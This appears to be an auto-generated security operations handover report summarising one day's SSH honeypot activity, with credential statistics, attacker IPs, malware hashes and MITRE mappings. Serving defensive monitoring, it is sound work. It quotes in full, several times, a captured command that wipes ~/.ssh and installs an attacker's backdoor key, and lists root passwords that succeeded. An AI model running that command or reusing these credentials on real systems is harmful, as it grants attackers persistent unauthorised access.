# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T14:30:41Z |
| **Shift Time** | 14:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **46** |
| Confirmed Threats | **42** |
| False Positives Filtered | **4** (8.7%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **13** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **36** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **21** |
| Unique Usernames | **12** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 4 |
| `blank` | 2 |
| `Unknown` | 2 |
| `GET / HTTP/1.1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `linux` | `101.36.228.201` | 2026-03-28T13:23:43 |
| `root` | `helpdesk` | `211.219.22.213` | 2026-03-28T13:46:24 |
| `root` | `3245gs5662d34` | `211.219.22.213` | 2026-03-28T13:46:28 |
| `root` | `vinay` | `40.81.244.142` | 2026-03-28T13:50:33 |
| `root` | `3245gs5662d34` | `40.81.244.142` | 2026-03-28T13:50:35 |
| `root` | `ubuntu` | `60.214.128.238` | 2026-03-28T13:52:01 |
| `root` | `unixunix` | `196.189.237.92` | 2026-03-28T13:52:46 |
| `root` | `3245gs5662d34` | `196.189.237.92` | 2026-03-28T13:52:51 |
| `root` | `tianhu@123` | `180.184.134.158` | 2026-03-28T14:01:22 |
| `root` | `3245gs5662d34` | `180.184.134.158` | 2026-03-28T14:01:25 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `196.189.237.92`, `180.184.134.158`, `211.219.22.213`, `40.81.244.142`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **23** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-90a9974d54f6

| Field | Detail |
|---|---|
| **Source IP** | `101.36.228[.]201` |
| **First Seen** | 2026-03-28 13:21 |
| **Last Seen** | 2026-03-28 13:24 |
| **Session Duration** | 188s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:21:47` | `cowrie.session.connect` |
| `2026-03-28 13:23:41` | `cowrie.client.version` |
| `2026-03-28 13:23:41` | `cowrie.client.kex` |
| `2026-03-28 13:23:43` | `cowrie.login.success` |
| `2026-03-28 13:24:55` | `cowrie.session.file_upload` |
| `2026-03-28 13:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.228[.]201` to AbuseIPDB if not already reported
- [ ] Block `101.36.228[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3be4a9b93da

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-03-28 13:46 |
| **Last Seen** | 2026-03-28 13:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:46:23` | `cowrie.session.connect` |
| `2026-03-28 13:46:23` | `cowrie.client.version` |
| `2026-03-28 13:46:24` | `cowrie.client.kex` |
| `2026-03-28 13:46:24` | `cowrie.login.success` |
| `2026-03-28 13:46:24` | `cowrie.session.params` |
| `2026-03-28 13:46:24` | `cowrie.command.input` |
| `2026-03-28 13:46:24` | `cowrie.command.failed` |
| `2026-03-28 13:46:25` | `cowrie.log.closed` |
| `2026-03-28 13:46:25` | `cowrie.session.params` |
| `2026-03-28 13:46:25` | `cowrie.command.input` |
| `2026-03-28 13:46:25` | `cowrie.session.file_download` |
| `2026-03-28 13:46:25` | `cowrie.log.closed` |
| `2026-03-28 13:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d38c24f87e

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-03-28 13:46 |
| **Last Seen** | 2026-03-28 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:46:27` | `cowrie.session.connect` |
| `2026-03-28 13:46:27` | `cowrie.client.version` |
| `2026-03-28 13:46:27` | `cowrie.client.kex` |
| `2026-03-28 13:46:28` | `cowrie.login.success` |
| `2026-03-28 13:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b7163532e6

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-03-28 13:50 |
| **Last Seen** | 2026-03-28 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:50:33` | `cowrie.session.connect` |
| `2026-03-28 13:50:33` | `cowrie.client.version` |
| `2026-03-28 13:50:33` | `cowrie.client.kex` |
| `2026-03-28 13:50:33` | `cowrie.login.success` |
| `2026-03-28 13:50:34` | `cowrie.session.params` |
| `2026-03-28 13:50:34` | `cowrie.command.input` |
| `2026-03-28 13:50:34` | `cowrie.command.failed` |
| `2026-03-28 13:50:34` | `cowrie.log.closed` |
| `2026-03-28 13:50:34` | `cowrie.session.params` |
| `2026-03-28 13:50:34` | `cowrie.command.input` |
| `2026-03-28 13:50:34` | `cowrie.session.file_download` |
| `2026-03-28 13:50:34` | `cowrie.log.closed` |
| `2026-03-28 13:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3efc90a9f8

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-03-28 13:50 |
| **Last Seen** | 2026-03-28 13:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:50:35` | `cowrie.session.connect` |
| `2026-03-28 13:50:35` | `cowrie.client.version` |
| `2026-03-28 13:50:35` | `cowrie.client.kex` |
| `2026-03-28 13:50:35` | `cowrie.login.success` |
| `2026-03-28 13:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e23a4053dc0e

| Field | Detail |
|---|---|
| **Source IP** | `60.214.128[.]238` |
| **First Seen** | 2026-03-28 13:52 |
| **Last Seen** | 2026-03-28 13:52 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:52:00` | `cowrie.session.connect` |
| `2026-03-28 13:52:00` | `cowrie.client.version` |
| `2026-03-28 13:52:00` | `cowrie.client.kex` |
| `2026-03-28 13:52:01` | `cowrie.login.success` |
| `2026-03-28 13:52:47` | `cowrie.session.file_upload` |
| `2026-03-28 13:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.214.128[.]238` to AbuseIPDB if not already reported
- [ ] Block `60.214.128[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-136a0a6f8e1f

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-03-28 13:52 |
| **Last Seen** | 2026-03-28 13:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:52:45` | `cowrie.session.connect` |
| `2026-03-28 13:52:45` | `cowrie.client.version` |
| `2026-03-28 13:52:45` | `cowrie.client.kex` |
| `2026-03-28 13:52:46` | `cowrie.login.success` |
| `2026-03-28 13:52:47` | `cowrie.session.params` |
| `2026-03-28 13:52:47` | `cowrie.command.input` |
| `2026-03-28 13:52:47` | `cowrie.command.failed` |
| `2026-03-28 13:52:47` | `cowrie.log.closed` |
| `2026-03-28 13:52:47` | `cowrie.session.params` |
| `2026-03-28 13:52:47` | `cowrie.command.input` |
| `2026-03-28 13:52:47` | `cowrie.session.file_download` |
| `2026-03-28 13:52:47` | `cowrie.log.closed` |
| `2026-03-28 13:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e6aa59ec976

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-03-28 13:52 |
| **Last Seen** | 2026-03-28 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 13:52:50` | `cowrie.session.connect` |
| `2026-03-28 13:52:50` | `cowrie.client.version` |
| `2026-03-28 13:52:50` | `cowrie.client.kex` |
| `2026-03-28 13:52:51` | `cowrie.login.success` |
| `2026-03-28 13:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b9502e65b4

| Field | Detail |
|---|---|
| **Source IP** | `180.184.134[.]158` |
| **First Seen** | 2026-03-28 14:01 |
| **Last Seen** | 2026-03-28 14:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 14:01:21` | `cowrie.session.connect` |
| `2026-03-28 14:01:21` | `cowrie.client.version` |
| `2026-03-28 14:01:21` | `cowrie.client.kex` |
| `2026-03-28 14:01:22` | `cowrie.login.success` |
| `2026-03-28 14:01:22` | `cowrie.session.params` |
| `2026-03-28 14:01:22` | `cowrie.command.input` |
| `2026-03-28 14:01:22` | `cowrie.command.failed` |
| `2026-03-28 14:01:22` | `cowrie.log.closed` |
| `2026-03-28 14:01:23` | `cowrie.session.params` |
| `2026-03-28 14:01:23` | `cowrie.command.input` |
| `2026-03-28 14:01:23` | `cowrie.session.file_download` |
| `2026-03-28 14:01:23` | `cowrie.log.closed` |
| `2026-03-28 14:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.134[.]158` to AbuseIPDB if not already reported
- [ ] Block `180.184.134[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a61ceb1e868f

| Field | Detail |
|---|---|
| **Source IP** | `180.184.134[.]158` |
| **First Seen** | 2026-03-28 14:01 |
| **Last Seen** | 2026-03-28 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 14:01:25` | `cowrie.session.connect` |
| `2026-03-28 14:01:25` | `cowrie.client.version` |
| `2026-03-28 14:01:25` | `cowrie.client.kex` |
| `2026-03-28 14:01:25` | `cowrie.login.success` |
| `2026-03-28 14:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.134[.]158` to AbuseIPDB if not already reported
- [ ] Block `180.184.134[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `16.58.56[.]214` | **7** | 2026-03-28 13:55 | 2026-03-28 14:05 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `101.36.228[.]201` | **3** | 2026-03-28 13:14 | 2026-03-28 13:20 | 6m | 0 | `T1592` | 🟢 LOW |
| `1.192.189[.]251` | 1 | 2026-03-28 14:21 | 2026-03-28 14:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.164.239[.]190` | 1 | 2026-03-28 14:01 | 2026-03-28 14:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.204.1[.]45` | 1 | 2026-03-28 14:02 | 2026-03-28 14:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.144.14[.]204` | 1 | 2026-03-28 13:21 | 2026-03-28 13:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.122[.]187` | 1 | 2026-03-28 14:16 | 2026-03-28 14:18 | 98s | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-28 14:00 | 2026-03-28 14:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `177.207.248[.]5` | 1 | 2026-03-28 13:26 | 2026-03-28 13:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.134[.]158` | 1 | 2026-03-28 14:01 | 2026-03-28 14:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.189.237[.]92` | 1 | 2026-03-28 13:52 | 2026-03-28 13:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.83.231[.]93` | 1 | 2026-03-28 13:45 | 2026-03-28 13:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.219.22[.]213` | 1 | 2026-03-28 13:46 | 2026-03-28 13:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.78.59[.]30` | 1 | 2026-03-28 14:23 | 2026-03-28 14:24 | 47s | 0 | `T1592` | 🟢 LOW |
| `220.135.110[.]10` | 1 | 2026-03-28 13:44 | 2026-03-28 13:45 | 30s | 0 | `T1592` | 🟢 LOW |
| `222.236.155[.]146` | 1 | 2026-03-28 13:02 | 2026-03-28 13:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.81.244[.]142` | 1 | 2026-03-28 13:50 | 2026-03-28 13:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.120[.]132` | 1 | 2026-03-28 13:22 | 2026-03-28 13:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.148[.]5` | 1 | 2026-03-28 14:22 | 2026-03-28 14:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]58` | 1 | 2026-03-28 13:01 | 2026-03-28 13:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.211.15[.]44` | 1 | 2026-03-28 12:57 | 2026-03-28 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.223.245[.]120` | 1 | 2026-03-28 13:41 | 2026-03-28 13:41 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `88.248.250[.]143` | 1 | 2026-03-28 13:42 | 2026-03-28 13:42 | 6s | 0 | `T1592` | 🟢 LOW |
| `93.120.239[.]98` | 1 | 2026-03-28 14:04 | 2026-03-28 14:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `60.223.245[.]120` | CN | China Unicom Shanxi Province Network | **100** ⚠️ | 50 |
| `122.144.14[.]204` | BD | Internet Service Provider | **100** ⚠️ | 39 |
| `54.211.15[.]44` | US | Amazon.com, Inc. | **100** ⚠️ | 10 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `47.251.120[.]132` | US | Alibaba Cloud - US | **100** ⚠️ | 4 |
| `49.124.148[.]5` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 24 |
| `14.103.122[.]187` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `40.81.244[.]142` | IN | Microsoft Corporation | **100** ⚠️ | 50 |
| `203.83.231[.]93` | CN | CHINANET Guangdong province network | **100** ⚠️ | 45 |
| `177.207.248[.]5` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 30 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 16 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 46 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (8.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
